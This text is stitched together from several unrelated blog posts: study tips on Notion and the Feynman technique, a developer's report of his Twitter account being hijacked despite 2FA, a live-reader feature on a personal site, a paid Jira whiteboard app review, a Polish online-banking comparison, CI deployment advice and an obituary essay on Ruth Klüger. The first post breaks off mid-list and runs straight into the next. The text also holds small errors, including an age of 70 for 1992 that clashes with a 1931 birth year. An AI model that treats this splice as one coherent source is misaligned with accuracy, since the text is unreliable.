do that is to write down a summary for each chapter without looking back.</p><p id="9e3b"><strong>Create bullet points and test yourself</strong></p><p id="97ed">The notion allows one to create structures of notes in a way that it enables testing and active recall. For example, you can use Toggle lists that expand once you click on a toggle, so you don’t see the information at first and can test yourself.</p><p id="a790">Emerson advised to use your subconsciousness to maximize your ROI. That’s right, before you go to sleep, think about the topic and ask questions. I will be writing them down on a piece of paper. Once I wake up, the first thing to do is to write my dreams or thoughts down. We’ve seen how the world’s geniuses such as Tesla, Da Vinci, Mendeleev harvested this method. I think it might be worthwhile trying.</p><p id="221c">Just ask a question before going to sleep. It’s that simple.</p><p id="6330">Organizing repetition is crucial. The best way to repeat something is when you are learning more on this topic, or when you need these thoughts for actions on your business and or other decisions. That’s why Tagging is important, and I must create a system of tag and Notes. I’ve been hearing a lot about the <a href="https://en.wikipedia.org/wiki/Zettelkasten" rel="noopener">Zettelkasten</a> method of note taking, and I want to explore how it works. Zettelkasten basically allows cross linking of various notes and entities, so you can tag practically everything, and make those connections around topics you are exploring and learning.</p><p id="a13d">Another good ways to understand and remember material, — is to present it to someone. That’s why I will be writing blog posts, making live videos and speaking in front of audiences.</p><p id="fcef">Many people refer to Feyman technique that allows robust learning and transformation of short term memory into new mental models:</p><p id="6e87"><strong>Essentially, the Feynman Technique is this:</strong></p><ol><li id="6de0">Identify the subject.

If you can <strong>teach</strong> a concept to a child, then you’re way ahead of the game.</li><li id="c9c9">Identify your <strong>knowledge</strong> gaps.

<p><strong>Status: 00:27 in the morning of December 4 my account was restored again.</strong> No words or explanations on how it happened – yet.</p>



<p>This morning (December 3rd, 2020) I woke up to find myself logged out from my Twitter account on the devices where I was previously logged in. Due to “suspicious activity” on my account. I don’t know the exact time this happened. I checked my phone at around 07:30 and then it has obviously already happened. So at time time over night.</p>



<p>Trying to log back in, I get prompted saying I need to update my password first. Trying that, it wants to send a confirmation email to an email address that isn’t mine! Someone has managed to modify the email address associated with my account.</p>



<p>It has only been two weeks since someone <a href="https://daniel.haxx.se/blog/2020/11/16/i-lost-my-twitter-account/" data-type="post" data-id="15196">hijacked my account</a> the last time and abused it for scams. When I got the account back, I made very sure I both set a good, long, password and activated 2FA on my account. 2FA with auth-app, not SMS.</p>



<p>The last time I wasn’t really sure about how good my account security was. This time I know I did it by the book. And yet this is what happened.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/12/Screenshot_2020-12-03-Losenordsaterstallning.png" alt="" width="467" height="328"><figcaption>Excuse the Swedish version, but it wasn’t my choice. Still, it shows the option to send the email confirmation to an email address that isn’t mine and I didn’t set it there.</figcaption></figure></div>



<h2>Communication</h2>



<p>I was in touch with someone at Twitter security and provided lots of details of my systems , software, IP address etc while they researched their end about what happened. I was totally transparent and gave them all info I had that could shed some light.</p>



<p>I was contacted by a Sr. Director from Twitter (late Dec 4 my time). We have a communication established and I’ve been promised more details and information at some point next week. Stay tuned.</p>



<h2>Was I breached?</h2>



<p>Many people have proposed that the attacker must have come through my local machine to pull this off. If someone did, it has been a very polished job as there is no trace at all of that left anywhere on my machine. Also, to reset my password I would imagine the attacker would need to somehow hijack my twitter session, need the 2FA or trigger a password reset and intercept the email. I don’t receive emails on my machine so the attacker would then have had to (also?) manage to get into my email machine and removed that email – and not too many others because I receive a lot of email and I’ve kept on receiving a lot of email during this period.</p>



<p>I’m not ruling it out. I’m just thinking it seems unlikely.</p>



<p>If the attacker would’ve breached my phone and installed something nefarious on that, it would not have removed any reset emails and it seems like a pretty touch challenge to hijack a “live” session from the Twitter client or get the 2FA code from the authenticator app. Not unthinkable either, just unlikely.</p>



<h2>Most likely?</h2>



<p>As I have no insights into the other end I cannot really say which way I think is the most likely that the perpetrator used for this attack, but I will maintain that I have no traces of a local attack or breach and I know of no malicious browser add-ons or twitter apps on my devices.</p>



<h2>Details</h2>



<p>Firefox version 83.0 on Debian Linux with Tweetdeck in a tab – a long-lived session started over a week ago (ie no recent 2FA codes used), </p>



<p>Browser extensions: Cisco Webex, Facebook container, multi-account containers, HTTPS Everywhere, test pilot and ublock origin.</p>



<p>I only use one “authorized app” with Twitter and that’s Tweetdeck.</p>



<p>On the Android phone, I run an updated Android with an auto-updated Twitter client. That session also started over a week ago. I used <em>Google Authenticator</em> for 2fa.</p>



<p>While this hijack took place I was asleep at home (I don’t know the exact time of it), on my WiFi, so all my most relevant machines would’ve been seen as originating from the same “NATed” IP address. This info was also relayed to Twitter security.</p>



<h2>Restored</h2>



<p>The actual restoration happens like this (and it was the exact same the last time): I just suddenly receive an email on how to reset my password for my account.</p>



<p>The email is a standard one without any specifics for this case. Just a template press the big button and it takes you to the Twitter site where I can set a new password for my account. There is nothing in the mail that indicates a human was involved in sending it. There is no text explaining what happened. Oh, right, the mail also include a bunch of standard security advice like “use a strong password”, “don’t share your password with others” and “activate two factor” etc as if I hadn’t done all that already…</p>



<p>It would be prudent of Twitter to explain how this happened, at least roughly and without revealing sensitive details. If it was my fault somehow, or if I just made it easier because of something in my end, I would really like to know so that I can do better in the future.</p>



<h2>What was done to it?</h2>



<p>No tweets were sent. The name and profile picture remained intact. I’ve not seen any DMs sent or received from while the account was “kidnapped”. Given this, it seems possible that the attacker actually only managed to change the associated account email address.</p>

        <small>2020-12-03</small>
        <p>This has been the most fun I’ve had with JavaScript in some time. A spiritual successor to the <a href="https://underjord.io/live-server-push-without-js.html">stupid solution</a> which allowed both me and my visitors to see the number of concurrent readers. It is also a piece of whimsy I’ve wanted to do for a while to add more magic and life to the site. The animations default to off to preserve CPU but do turn on the magic switch in the top right if you can and want to see the visuals. This is arguably less stupid.</p>
<p>What is it? Well, a live number of my readership for the entire site for one. If you turn on the magic you should also see the rough positions of other readers on the site that are on the same page as a small hovering geometric shape. I call them wisps.</p>
<p>It’s not often that you can see the footfalls of other people on the web unless they write a comment or something. I don’t want to expose my readers to one another in any privacy-sensitive way or in any fashion that requires moderation. This simply gives a rough indication of activity on the site and whether people are reading the same thing as you. And it moves around in fun ways.</p>
<p>Anyway, I enjoy it and I hope you will too. So how is this done? A small backend in Phoenix using Channels (basically just WebSockets), a small amount of Javascript to render new elements and update positions based on the state updates from the backend. The idle hovering of the symbols is CSS Animation and moving from area to area as the reader reads on is done via CSS Transitions.</p>
<p>I was hoping to default to on, but as I’ve found out with my sweet animated gradient lines, CSS aninmation can get CPU intensive. Right now my gradient lines pause after a period of inactivity and only run if there is activity. They hit 12% or so on my CPU which is dumb. A better fix to make them more lightweight is on the way, the idle-handling is a mitigation. So for these I wanted to avoid a big performance hit. They perform okay right now from my tests, they use the cheap-to-animate transforms so there’s nothing too heavy. But also, there’s not a known upper bound on the potential number of wisps active at the same time and if that scales poorly on some browsers I don’t want to default to setting someone’s phone on fire.</p>
<p>The number is available regardless since that doesn’t animate. I think showing this sort of thing is a fair way of both measuring concurrent visitors and sharing that with the visitor. I can see it, you can see it. I’ve also been considering a 90’s web visitor counter that is actually live. Could be fun. Just gotta find the right aesthetic.</p>
<p>I like this way of extending my site. I guess in a JAMStack fashion. The site is static but I can build small interactive parts and back them with minimal backends which for stateful applications Elixir does exceedingly well. If these backends go down the site will still work. All the important stuff is there. The fun stuff degrades to a connection error in the console.</p>
<p>Let me know how you like it, I do get and read responses to my posts and I appreciate when y’all reach out so try that via <a href="mailto:lars@underjord.io">lars@underjord.io</a> or @ me on Twitter <a href="https://twitter.com/lawik">@lawik</a>.

<p><strong>Paid partnership with&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://spartez-software.com/">Spartez Software</a></strong></p>



<p>Yep, you read that right. This week I am working with <a href="https://spartez-software.com/" target="_blank" rel="noreferrer noopener">Spartez</a> to review their new <a href="https://marketplace.atlassian.com/apps/1223211/whiteboards-for-jira-team-collaboration?hosting=cloud&amp;tab=overview" target="_blank" rel="noreferrer noopener">Whiteboards for Jira App</a>. And before you get worried – no, I have no intention of letting that change how I do reviews. I’ll go over the general idea of an app and give you some use cases. Then I’ll take a deeper dive into the feature set and end with my usual analysis – including how the App can be improved. And you can always find a way to enhance any App. I should note now, though, that the App is for Jira and Confluence Cloud only. But we’ll get to that in a bit.&nbsp;</p>



<p>Now, the world has had a crash course in working remotely. I had a bit of a head start, with me starting a remote job at the End of September ’19, versus most everyone’s February to March ’20. However, there is one thing that I’ve missed most. Sometimes it’s just easier to get someone into a meeting room with a markerboard and collaborate while drawing out the workflow, feature, automation, or what-have-you. There isn’t a good analog in the virtual space. A slack meeting comes close, but *not* quiet there, and both Zoom and Webex don’t even come close.</p>



<p>Fortunately, Spartez has been thinking the same thing. If you are not familiar with them, they are often known for Apps like Agile Poker and Agile Cards. To me, it seems they are always a go-to pick when you need to bridge the gap between the physical world and the digital one for your Agile practices. I’ve used both of the apps mentioned above before and have rarely had a problem with them.&nbsp;</p>



<p>However, they were facing a similar problem that most of us now face. How do we take some of the same practices we used to do in person together and take that online? One such challenge is Whiteboarding an idea out. And this was what Grzegorz Tańczyk was thinking about as he was preparing for Atlassian’s Codegeist 2020 hackathon.&nbsp;&nbsp;</p>



<p>This concept isn’t a new idea, however. There are several similar products already on the market, including Gliffy and Miro. However, the key to this is that it is Jira Cloud Native. This fact means it can import and change your issues already in Jira and create new content on your whiteboard.&nbsp;</p>



<p>When I saw the demo, I couldn’t help but think of all the potential use cases. There were the normal ones for sorting and updating issues. For example, you can set an “Update Issues” area to be a “Rank” Area and sort your issues there, and that new ranking will be updated on the Jira Issues. Or you can set an “Update Issues” Area to update the assignee so that any issues dragged there are assigned to that person.&nbsp;&nbsp;</p>

<p>However, the idea that captured me was the ability to add Images to it. Imagine this – you are on a UI/UX Team. You need some feedback on a new design change you are working on. So you set up a Webex/Zoom, so everyone can talk, and set up a Whiteboard with the new design on it. Then people can comment on various parts of it on the whiteboard – in real-time. And once a comment is settled on, you can directly convert those comments into Jira issues to be worked on.</p>

<p>That’s the thing, though; this lets you collaborate in real-time. During the product demo, I was invited onto the board. So imagine, here I am in the US; meanwhile, the two people giving the demo for Spartez are in Poland. However, on the call, I could see the edits I was making show up on their board in real-time. That fact alone was amazing. And I didn’t even have to sign up to their Jira instance and take up a license!&nbsp;</p>



<p>So, let’s drill down into some features and see what this App can do.</p>







<h2>Collaborate concurrently with all your team members</h2>



<p>I’ve already touched on this – but this is the whole point. An in-person whiteboard is fantastic for collaboration. And this App is one of the closest experiences I’ve seen to that experience. This App allows you and your teammates, stakeholders, or any interested party to get together and work on an idea or task quickly, all while being aware of what is in Jira.</p>



<h2>Easily populate the whiteboard with existing Jira issues or create new ones.</h2>



<p>This concept, I think, is where this App excels against its competitors. To my knowledge, no other integration allows you to inject your Jira issues directly to the board to be a part of the experience.&nbsp;&nbsp;</p>

<h2>Edit, update, rank, or transition Jira issues – individually, in a bulk, or via update zones.</h2>



<p>So, in the “before times,” one thing I liked about using whiteboards is it allowed you to organize information in a 2D space. Jira Agile Boards comes close, but they only allow you to manage along one axis.</p>



<p>Here, you are free to set up 2D “Zones” that affect your Jira issues. This ability means you can have one area of the board for your backlog, where you rank your issues, then another for planned work, where you have different “Buckets” to assign it to users, then a third to represent your Agile board. All of this is managed on the same screen, as intuitively as “drag-and-drop.”&nbsp;&nbsp;</p>



<div><figure><img data-attachment-id="2683" data-permalink="https://thejiraguy.com/image-4-16/" data-orig-file="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png" data-orig-size="597,587" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-4" data-image-description="" data-medium-file="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=300" data-large-file="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=597" src="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=597" alt="" srcset="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png 597w, https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=150 150w, https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=300 300w" sizes="(max-width: 597px) 100vw, 597px"></figure></div>



<p>You can also drag and select a group of issues, edit them in real-time, give you a refined “Bulk Edit” option, or edit issues individually. The team leaned in because this was connected to Jira and really worked to make sure these capabilities were up to snuff, and it shows. Well done!</p>



<h2>Control the access using Jira permissions.</h2>



<p>This. 100% This. I consider permissions to be essential for any app. Yeah, you might want to keep this open and let everyone use it. Or you might not. Or some mix there-in. The fact is, having permissions that can easily be set gives you that control, rather than the App Developer.</p>



<h2>View in real-time what other participants do.</h2>



<p>They do mean real-time. As I said, this point was the one where most of my concerns lay during the demo. However, Spartez was willing to demonstrate it, granting me limited access to their demo board. And there was a slight delay – but that’s only because Physics is a cruel mistress. But honestly, I had to&nbsp;<strong><em>really&nbsp;</em></strong>pay attention to even notice it – most users probably won’t ever see it.&nbsp;</p>



<h2>Use post-it cards, images, videos, or draw anything.</h2>



<p>Sure, this can be a useful feature. I stated a use case for this above. But this feature can be fun. Yes, the App does support animated gifs. I checked.&nbsp;&nbsp;</p>

<h2>What this App does Well</h2>



<p>Well, this App does what it sets out to do, which is enable collaboration by allowing users to work on a virtual Whiteboard. However, the ability to manipulate your Jira issues in real-time via the board is where this App shines. It’s intuitive, useful, and fun to use. And it’s not often I can say that in Jira.</p>



<h2>What this App could work on</h2>



<p>Well, the obvious needs to be stated here. Whiteboards for Jira is only available for Jira Cloud right now. I know for some of you out there, this is a deal breaker.  This situation is sufficient to start with, but I too would love to see this on a Jira Server or Data Center instance.&nbsp;&nbsp;</p>



<p>Another feature I’d love to see is an option to “Snap to grid.” You can always snap things to other nearby objects, but the first object is always free-hand. I’d love to see some way to add an option to snap it to a grid – because, you know, some of us are perfectionists.&nbsp;</p>



<h2>Would I recommend this App?</h2>



<p>First, given the current offering, I can only recommend this App if you are on Jira Cloud. I’m hoping that will change soon, but Cloud is the only place you can get it.&nbsp;&nbsp;</p>



<p>And honestly, this App is meant to solve a specific problem. Some teams prefer to use a whiteboard; some teams are fine using digital tools and don’t need it. So, if your one of the former teams who, in the “before-times,” would use a whiteboard, I say get it. Your Teams will likely thank you for it.&nbsp;&nbsp;</p>



<h2>Whiteboard for Jira’s Tier Rank</h2>



<p>This one was hard for me. If I go on functionality alone, It’s an easy A. However, the limited availability is an essential factor. I maintain a free tier Jira Cloud system for testing, but it’s not my daily driver. Given the whole package, I need to give it a B+, with upgrade potential to an A down the road.&nbsp;</p>

	<section>
		<p>If you trace the news in financial services (banking, insurance, etc.), it's hard not to be overly enthusiastic - the terms like <em>'digital disruption'</em>, <em>'fintech innovation'</em>, <em>'banking 3.0'</em>, <em>'blockchain-powered XYZ'</em>, <em>'transformative services'</em> are flying left and right in everyday announcements. Apparently, very conservative, highly regulated, traditional institutions are now in absolute avant-garde of user-focused, technological revolution, making Internet-era behemoths like Google, Microsoft, Amazon or Facebook pale in comparison.</p><p>Or maybe it's <u><strong>utter crap</strong></u>?</p><p>Cheap PR? Buzzword bingo? Painting the dead grass green? A modern equivalent of H.C.Andersen's <em>"The Emperor's New Clothes"</em>? Hmm, what could be the easiest way to verify that?</p><p>How about performing a ... <strong>time travel</strong>? I mean: going back in time 10-15 years and comparing what banks (or other financial institutions) provided THEN with what they do provide NOW. Because that's what really matters - making a difference from the customer's perspective by providing better customer experience, more valuable products and services, etc. Updating the visual style to look like material design ain't enough.</p><p>Time travel sounds like something beyond our capacity these days, but ... luckily I think can help here. In this particular case, I can really make it happen! How come?</p><p><em><a href="https://www.youtube.com/watch?v=tAVVy_x3Erg">Stay awhile and listen ...</a></em></p><p>In 2001 I've opened a bank account in a completely new bank which was (AFAIK - I'm not 100% sure here) the 1st true Internet bank (no physical branches, just the Internet access - you could do everything on-line, even opening the account) in Poland. It was named <a href="https://inteligo.pl/">Inteligo</a>, and you can read more about it <a href="https://en.wikipedia.org/wiki/Inteligo">here</a>. To be honest: those days it was a real game-changer (when compared to traditional banking with money transfers that required you to appear physically in the bank's branch or postal office ...).</p><p>But the very next year (in 2002) <strong>Inteligo</strong> was fully (100%) acquired by the largest bank in Poland - <strong>PKO BP</strong>. That institution was (and is) perceived as a very traditional one - aimed at retirees, elderly people - in general folks who are somewhat distrustful and reluctant to change. What a marriage, wasn't it?</p><p>Fast forward 18 years:</p><ul><li><strong>PKO BP</strong> didn't really "merge" with <strong>Inteligo</strong> at all - it's still a separate service (with a separate brand, pool of financial products, UI, etc.)</li><li>the development of <strong>Inteligo</strong>, which was unquestioningly one of the most innovative banks of its era, has ... pretty much ceased (except few meaningless details I'll cover later) - probably its owner didn't want to invest there and focused on its core e-banking offer (named <a href="https://www.ipko.pl/">'iPKO'</a>) instead; feel free to check the "evolution" of the infosite frontpage in <a href="https://web.archive.org/web/20010601000000*/inteligo.pl">web archive</a>.</li><li>the development of iPKO has progressed steadily (backed up with shitloads of investment) throughout all the past years, bringing the new versions of the web user interface, mobile apps, etc.</li><li>nevertheless, I didn't terminate my <strong>Inteligo</strong> account - I still use it mainly to pay the monthly bills, like a small "sash" just for that purpose</li></ul><figure><img src="https://no-kill-switch.ghost.io/content/images/2020/12/header.png" alt="" srcset="https://no-kill-switch.ghost.io/content/images/size/w600/2020/12/header.png 600w, https://no-kill-switch.ghost.io/content/images/2020/12/header.png 800w" sizes="(min-width: 720px) 720px"><figcaption>Oh, those gradients, so 90-tish :)</figcaption></figure><p>You've probably figured it out already, but I'll state it explicitly - that situation provides me a unique opportunity <u>to compare a banking experience straight from 2002 with the one of the 2020 industry leader</u> (here in Poland). And answer the following questions:</p><ol><li>how much did the banks really progress in the past 18 years?</li><li>what is easier/better/more convenient from the end-user's perspective?</li><li>... or maybe some things have actually worsened?</li><li>did the changes introduced by banks change my behaviors when it comes to finances?</li></ol><p>I can't wait to dive into the details, so let's not delay any longer!</p><p>Let's expand the context on how I do banking, just a bit. My financial behavioral profile looks like that:</p><ul><li>I have both private and company (as an individual entrepreneur) accounts - in a few currencies (usual suspects like EUR or USD, none of the exotics)</li><li>I use both debit and credit cards</li><li>I have used both cash loans and the mortgage in the past</li><li>I've bought car insurance via the bank's partnership once</li><li>I don't use direct debit, its paperwork is freaking cumbersome - I prefer to set subscription-based, regular payments out of the bank</li><li>obviously, I do money transfers, domestic and international</li><li>I've used a few forms of savings, but no investments like stocks or derivatives</li><li>No installment purchases</li><li>I've requested few atypical operations in the past: like early repayments or rebinding mortgage to a different current account - but nothing really fancy</li></ul><p>I don't think I'd call myself a heavy financial instruments user, but probably I'm still above the average. On top of that, I'm a tech-savvy, heavyweight Internet user - I avoid both physical branch visits and call-centers (both phone and video-call versions) at all cost.</p><p>When it comes to banking, I generally prefer browser over mobile apps (exception: Revolut, because they have really good, laser-focused mobile apps). The reason is simple: when I'm browsing my savings or making a transfer, I'd like to have some privacy. In my case, privacy usually means having one of my laptops within a hand reach anyway, so ...</p><p><em>To be continued (next week)</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Continuous integration services like <a href="https://www.jenkins.io/">Jenkins</a>, <a href="https://bitbucket.org/product/features/pipelines">Bitbucket Pipelines</a>, <a href="https://circleci.com/">CircleCI</a>, <a href="https://github.com/features/actions">GitHub Actions</a>, <a href="https://docs.gitlab.com/ee/ci/">Gitlab CI/CD</a> force extreme automation. They require your continuous integration flows to run non-interactively in remote environments. Most of these tools do not allow you to interact with the continuous integration environment.</p>



<p>All of these tools require users to define deployment workflows in custom definition languages. It is very common in my experience that users of these services can <em>only</em> run their deployment workflows using the service in question.</p>



<p>When something goes wrong with a deployment, debugging takes the form of a <strong>deployment death loop</strong>:</p>



<ol><li>Make changes locally (mostly to continuous integration configuration files).</li><li>Push to the appropriate branch on your git host (usually <em>master</em>).</li><li>Wait for a job to start on your continuous integration service.</li><li>Wait minutes or even tens of minutes following the logs to see if your changes fixed the issue.</li><li>Repeat this procedure until you have solved the problem.</li></ol>



<p>Things are even worse when you have to debug configuration that lives in a database or on a configuration management system such as <a href="https://www.vaultproject.io/">Vault</a> or <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-parameter-store.html">Parameter Store</a>. If you can’t manually trigger a workflow, you are forced to push superficial changes to your git repository (like adding punctuation or white space to your README) to see if your changes worked.</p>



<p>How to break out of this death loop?</p>



<p>Two suggestions:</p>



<p>First, <strong>any developer should be able to deploy from their local environment</strong> (provided they have the required level of access). The continuous integration workflow definition should be secondary to this mechanism. If possible, it should make use of this mechanism.</p>



<p>For example, at <a href="https://alpha.bugout.dev/">Bugout</a>, our services are deployed by a bash script which can be executed on our servers via SSH. Even in production, if a developer has access to the production servers, they can run a deployment by simply running a git pull and then the deployment script over SSH. This is useful not only when debugging deployments but also when our continuous integration service goes down, <a href="https://www.githubstatus.com/incidents/sxthxvdlljk4">which has been known to happen</a>.</p>



<p>Second, <strong>embrace </strong><a href="https://en.wikipedia.org/wiki/Checklist"><strong>checklists</strong></a>. Have a checklist of external actions that must be taken before a change can be deployed. This checklist can include things like running database migrations, setting environment variables, or modifying a load balancer.</p>



<p>It’s okay to check items off such a checklist manually. Manual checklists may invalidate ideas of fully automated deployments. This is alright. Deployments that require manual steps should be performed with human oversight.</p>



<p>The general principle is to <strong>favor interactivity over automation</strong>. Make your deployments interactive by default. You will not regret it.</p>

<p>Last month saw the passing of Ruth Klüger, one of the most influential memoirists of the Holocaust, at age 88. Born to a Jewish family in Vienna in 1931, Klüger was deported to Theresienstadt with her family shortly before her eleventh birthday then transferred to Auschwitz and a women’s subcamp of Gross-Rosen concentration camp. She survived Auschwitz by lying about her age, after a female clerk told her to say she was 15 when she was only 12 in order to be transferred for work in a labor camp. In her memoir, Klüger presents this moment, to which she owed her life, as neither heroic, nor redemptive, but human. “What more do you need for an example of perfect goodness?” (<em>Still Alive</em>,108). Klüger and her mother ultimately survived by escaping from a death march. Her brother and father were murdered. After the war Klüger studied in Regensburg and then in 1947 emigrated with her mother to the United States, where she graduated from Hunter College and went on to earn a Ph.D. in German from Berkeley. She became a professor of German literature and taught at a number of universities, including Princeton (where she became the first female full professor of German) and the University of California, Irvine.</p>



<p>At Irvine, Klüger oversaw a study abroad program in Göttingen, Germany, where she was struck by a bicycle in 1989. As she emerged from a days-long coma, she began to recall long-repressed memories and began to write. As <a href="https://www.jstor.org/stable/10.5749/j.ctttv6p4.9">Michael Rothberg</a> writes, “In her reconstruction of her thoughts as the bicyclist bore down on her, the bicycle and headlight are transformed into barbed wire and a spotlight” (130). Klüger’s memoir, <em>Weiter Leben</em>, published in German in 1992 (“German, strange as this statement may sound, is a Jewish language” (<em>Still Alive</em>, 205)), when she was 70, was a bestseller and won major awards. It can be said to exemplify what Freud called <a href="https://doi.org/10.1177/0959354314530812"><em>Nachträglichkeit</em>, trauma delayed</a>. <a href="https://www.jstor.org/stable/10.5749/j.ctttv6p4.9">Rothberg</a> praised her memoir for depicting “a site of extreme violence as a borderland of extremity and everydayness” and described it as a model of a literary mode he termed “traumatic realism,” which breaks through deadlock between “realist” versus “antirealist” Holocaust representation (109).The English version, <em>Still Alive</em>,was published in 2001. The book is widely taught in university courses and is used as an eyewitness testimony in major works of Holocaust historiography including Saul Friedländer’s <a href="https://www.harpercollins.com/products/nazi-germany-and-the-jews-saul-friedlander"><em>Nazi Germany and the Jews</em></a>(1997/2007) and Peter Fritzsche’s <a href="https://books.google.com/books?id=nIUFQGN2y4EC&amp;printsec=frontcover&amp;source=gbs_ge_summary_r&amp;cad=0#v=onepage&amp;q&amp;f=false"><em>Life and Death in the Third Reich</em></a>(2008).</p>

<p>Klüger stands out among survivors for her outspoken critical stance toward Holocaust remembrance culture. She <a href="https://www.jstor.org/stable/43555106">once said to the German Studies Association</a>, “the present memorial cult that seeks to inflict certain aspects of history and their presumed lessons on our children, with its favorite mantra, ‘Let us remember, so the same thing doesn’t happen again,’ is unconvincing. To be sure, a remembered massacre may serve as a deterrent, but it may also serve as a model for the next massacre” (GSA, 392). She called out Holocaust tourism, asking what the “carefully tended, unlovely remains” of former concentration camps could possibly communicate of the experience of being imprisoned there (<em>Still Alive</em>, 63). “I don’t go to these concentration camp memorial sites,” she once flatly told <a href="https://www.spiegel.de/international/holocaust-survivor-ruth-klueger-vienna-reeks-of-anti-semitism-a-435879.html"><em>Der Spiegel</em></a>, and she even asked the Auschwitz Museum to take down her poems, which were displayed there against her wishes (111). “I don’t hail from Auschwitz, I come from Vienna,” she wrote, and it seems that this attitude led her to <a href="https://www.dw.com/en/holocaust-survivor-and-author-ruth-kl%C3%BCger-dies-at-88/a-55188986">opt</a> to have the number tattooed on her arm removed in later life (112). She remained especially critical of German attempts to identify with victims from the Nazi era. “Defeat,” she reflected, “bred its own variants of nationalism”—a kind of <a href="https://books.google.com/books?id=eATtDwAAQBAJ&amp;pg=PT416&amp;lpg=PT416&amp;dq=%22negative+exceptionalism%22+rabinbach&amp;source=bl&amp;ots=pF_fBLAbO7&amp;sig=ACfU3U39FqK-RnvEvVtrDkPULc064HmiFg&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwjgmt-RnpztAhXmGVkFHd6mCN0Q6AEwAXoECAEQAg#v=onepage&amp;q=%22negative%20exceptionalism%22%20rabinbach&amp;f=false">negative exceptionalism</a> about German crimes (163).</p>



<p>Writing in the wake of popular milestones like <em>Holocaust </em>(1978) and <em>Schindler’s List </em>(1993), Klüger echoed critics of <a href="https://www.tandfonline.com/doi/abs/10.1080/14623529908413937">“the Americanization of the Holocaust”</a> and <a href="https://www.jstor.org/stable/j.ctt16gzj0m">“the end of the Holocaust,”</a> for whom brutal historical reality was displaced by redemptive and enjoyable kitsch. The problem of this oxymoronic “Holocaust aesthetics” became apparent to Klüger after a young woman approached her at a book signing and said, with a smile, “<em>I love the Holocaust</em>.” Klüger was taken aback. She understood that the woman loved not the event itself, but reading about it. “But her naïve and undisguised pleasure brought up the question: Should she love to read about the Holocaust? <em>Should</em> we in any shape or form feel positive and empowered or cathartically purged when we contemplate the extinction of a people? My impulse was to say to this woman: You shouldn’t. Stop reading these books, including mine, if you enjoy them” (GSA, 393).</p>



<p>This anecdote, Klüger reflects, validates continued discussion of Theodor Adorno’s famous <a href="https://books.google.com/books?id=f1y_dX04yBgC&amp;lpg=PP1&amp;pg=PA34#v=onepage&amp;q&amp;f=false">claim</a> that to write poetry after Auschwitz is barbaric, however much one may <a href="https://www.jstor.org/stable/488568">disagree with it</a>. She worried about <a href="https://www.jstor.org/stable/43555106">Holocaust literature slipping into “kitsch”</a>&nbsp;and reflected about the popularity of Anne Frank’s diary, “it is easier to shed tears over an unfortunate little girl than to agree or disagree with an eminently rational Italian chemist with pronounced opinions that was Primo Levi” (GSA, 400). Telling are the two other survivor authors she praises: the Hungarian Imre Kertész, who reflected on the paradox that once the Holocaust is written about, experience is substituted by the “artefact” of narrative representation, and who was also critical of <a href="https://books.google.com/books?id=toS1uAAACAAJ&amp;dq=The+Holocaust+as+Culture+Thomas,+Kert%C3%A9sz,+Imre&amp;hl=en&amp;newbks=1&amp;newbks_redir=0&amp;sa=X&amp;ved=2ahUKEwjlsqPEpprtAhUaRTABHVy6AqUQ6AEwAHoECAAQAg">“Holocaust culture.”</a> She also names the Polish writer Tadeusz Borwoski, whose acerbic <a href="https://en.wikipedia.org/wiki/This_Way_for_the_Gas,_Ladies_and_Gentlemen"><em>This Way to the Gas, Ladies and Gentlemen</em></a>(1946) she criticizes for its antisemitism and fictional embellishments, while also recognizing “the starkness with which Borowski portrays the slide from indifference to depravity at the edge of human existence and endurance” (GSA, 402).</p>



<p><em>Still Alive </em>is also notable for its “feminist” discussions of <a href="https://www.journals.uchicago.edu/doi/full/10.1086/668607">nonconsensual sex work</a> in the camps that debunked popular “whorehouse fantasies” and “a thriving cottage industry” of Holocaust-themed pornography (184), while also problematizing Holocaust “photos as an instrument of sublimated voyeurism” (159). But <em>Still Alive</em> stands out most for its <a href="https://press.uchicago.edu/ucp/books/book/chicago/T/bo25956860.html">bitter tone</a>. A reviewer <a href="https://www.nytimes.com/2020/10/16/us/ruth-kluger-dies.html">wrote</a> thatKlüger “unsentimentally redefined the conventional mythos of the heroic Holocaust survivor,” and indeed she <a href="https://www.washingtonpost.com/local/obituaries/ruth-kluger-author-of-searing-and-celebrated-holocaust-memoir-dies-at-88/2020/10/09/eeee3b16-0a2a-11eb-9be6-cf25fb429f1a_story.html">rejected</a> the idea that suffering united victims as “sentimental rubbish.” Instead she <a href="https://www.washingtonpost.com/local/obituaries/ruth-kluger-author-of-searing-and-celebrated-holocaust-memoir-dies-at-88/2020/10/09/eeee3b16-0a2a-11eb-9be6-cf25fb429f1a_story.html">challenged her readers</a> to “rearrange a lot of furniture in their inner museum of the Holocaust,” <a href="https://www.dw.com/en/holocaust-survivor-ruth-kl%C3%BCger-germany-has-changed/a-19005242">reminding</a> them that “Surviving was not normal. Death was normal.” As the <a href="https://www.wienerzeitung.at/nachrichten/kultur/literatur/2077830-Autorin-Ruth-Klueger-gestorben.html"><em>Wiener Zeitung</em></a> fittingly titled their obituary, Klüger modeled “surviving relentlessly.”</p>



